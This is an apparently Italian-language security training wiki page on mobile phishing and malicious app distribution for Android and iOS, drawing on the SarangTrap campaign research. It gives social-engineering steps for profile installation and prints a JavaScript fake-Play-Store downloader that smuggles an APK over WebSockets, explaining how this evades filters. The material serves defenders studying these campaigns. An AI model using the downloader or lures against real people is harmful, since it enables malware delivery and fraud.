# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Questa pagina copre tecniche usate da threat actors per distribuire **malicious Android APKs** e **iOS mobile-configuration profiles** tramite phishing (SEO, social engineering, fake stores, dating apps, ecc.).
> Il materiale è adattato dalla campagna SarangTrap esposta da Zimperium zLabs (2025) e da altre ricerche pubbliche.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Registrare decine di domini look-alike (dating, cloud share, car service…).
– Usare parole chiave nella lingua locale ed emoji nell'elemento `<title>` per posizionarsi su Google.
– Ospitare *sia* le istruzioni di installazione Android (`.apk`) *sia* iOS sulla stessa landing page.
2. **First Stage Download**
* Android: link diretto a un APK *unsigned* o di “third-party store”.
* iOS: `itms-services://` o link HTTPS normale a un profilo malevolo **mobileconfig** (vedi sotto).
3. **Android Post-install Behaviour**
* Esecuzione vincolata da C2, abuso dei permessi, dropper bypasses, raccolta in background e altri comportamenti malware post-installazione sono trattati nella pagina dedicata Android Malware Post-Exploitation qui sotto.
4. **iOS Delivery Technique**
* Un singolo **mobile-configuration profile** può richiedere `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ecc. per iscrivere il dispositivo a una supervisione simile a “MDM”.
* Istruzioni di social engineering:
1. Apri Impostazioni ➜ *Profile downloaded*.
2. Tocca *Install* tre volte (screenshot nella pagina di phishing).
3. Fidati del profilo unsigned ➜ l'attaccante ottiene entitlement *Contacts* e *Photo* senza revisione App Store.
5. **iOS Web Clip Payload (phishing app icon)**
* I payload `com.apple.webClip.managed` possono **fissare una phishing URL alla Home Screen** con un'icona/etichetta brandizzata.
* I Web Clips possono funzionare a **schermo intero** (nasconde l'interfaccia del browser) ed essere marcati come **non removabili**, costringendo la vittima a eliminare il profilo per rimuovere l'icona.
6. **Network Layer**
* Plain HTTP, spesso sulla porta 80 con header HOST come `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → facile da individuare).

## Android Malware Post-Exploitation

Per il tradecraft malware Android post-installazione come C2, abuso di Accessibility, overlay, automazione ATS, staged DEX loading, premium SMS e persistenza, vedere:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Gli attacker sostituiscono sempre più spesso i link statici APK con un canale Socket.IO/WebSocket incorporato in lures dall'aspetto di Google Play. Questo nasconde l'URL del payload, bypassa i filtri su URL/estensioni e mantiene una UX di installazione realistica.

Flusso tipico lato client osservato nel mondo reale:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Perché evade i controlli semplici:
- Nessun URL statico dell'APK viene esposto; il payload viene ricostruito in memoria dai frame WebSocket.
- I filtri URL/MIME/estensione che bloccano le risposte .apk dirette possono non rilevare dati binari instradati tramite WebSockets/Socket.IO.
- I crawler e le sandbox URL che non eseguono WebSockets non recupereranno il payload.

Vedi anche il tradecraft e gli strumenti WebSocket:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References


- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Socket.IO](https://socket.io)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
